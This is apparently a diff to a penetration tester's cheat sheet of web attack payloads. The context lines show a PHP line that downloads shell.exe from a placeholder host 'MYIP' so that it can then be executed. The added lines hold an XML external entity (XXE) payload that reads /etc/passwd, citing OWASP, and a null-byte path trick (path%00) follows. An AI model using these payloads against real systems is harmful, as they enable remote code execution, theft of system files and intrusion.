@@ -55,6 +55,13 @@ file_put_contents("shell.exe", fopen("http://MYIP/temp/shell.exe", "r"));
 ?>
 Then I would use execute shell commnad, exampled above to execute the file.
 
+Bypass XML:
+<?xml version="1.0"?>
+<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<xml>
+  <stuff>&xxe;</stuff>
+</xml>    -  https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing - Read more
+
 null:
 path%00
 
